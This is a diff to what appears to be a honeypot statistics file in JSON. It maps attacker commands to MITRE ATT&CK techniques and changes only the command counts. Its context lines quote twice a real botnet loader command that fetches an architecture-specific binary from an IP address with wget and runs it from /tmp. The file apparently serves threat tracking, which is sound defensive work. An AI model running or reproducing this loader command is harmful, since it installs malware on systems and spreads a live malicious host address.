@@ -25,7 +25,7 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 7171,
+      "count": 7172,
       "distinct_ips": 435,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:7376/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:7376/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1 &",
@@ -59,7 +59,7 @@
         "discovery"
       ],
       "url": "https://attack.mitre.org/techniques/T1082",
-      "count": 365,
+      "count": 366,
       "distinct_ips": 39,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:7376/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:7376/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1 &",
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 339158,
-  "matched_commands": 132308
+  "total_commands": 339161,
+  "matched_commands": 132309
 }
